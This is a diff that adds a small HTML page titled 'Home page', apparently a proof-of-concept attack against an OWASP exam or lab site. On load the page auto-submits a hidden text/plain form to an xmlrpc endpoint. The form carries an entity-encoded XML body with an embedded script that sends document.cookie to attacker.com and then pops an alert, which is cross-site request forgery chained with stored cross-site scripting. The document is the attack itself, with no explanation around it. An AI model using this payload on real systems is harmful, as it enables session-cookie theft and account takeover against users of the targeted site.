@@ -1,0 +1,17 @@
+<html>
+<head>
+<title>Home page</title>
+</head>
+<body>
+
+    <form action="https://owasp-exam.ir/xmlrpc" method="POST" enctype="text/plain">
+        <input type="hidden" name="&lt;&#63;xml&#32;version"
+            value="&quot;1&#46;0&quot;&#32;encoding&#61;&quot;UTF&#45;8&quot;&#32;&#63;&gt;&#13;&#10;&lt;root&gt;&#13;&#10;&#32;&#32;&lt;data&gt;&#13;&#10;&lt;a&#58;script&#32;xmlns&#58;a&#61;&quot;http&#58;&#47;&#47;www&#46;w3&#46;org&#47;1999&#47;xhtml&quot;&gt;let&#32;XHR&#61;&#32;new&#32;XMLHttpRequest&#40;&#41;&#59;&#13;&#10;XHR&#46;open&#40;&quot;GET&quot;&#44;&quot;https&#58;&#47;&#47;attacker&#46;com&#47;&#63;data&#61;&quot;&#43;document&#46;cookie&#44;true&#41;&#59;&#13;&#10;XHR&#46;send&#40;&#41;&#59;&#13;&#10;alert&#40;origin&#41;&lt;&#47;a&#58;script&gt;&#13;&#10;&lt;&#47;data&gt;&#13;&#10;&lt;&#47;root&gt;" />
+        <input type="submit" value="Submit request" style="display: none;" />
+    </form>
+</body>
+<script>
+    document.forms[0].submit();
+</script>
+
+</html>
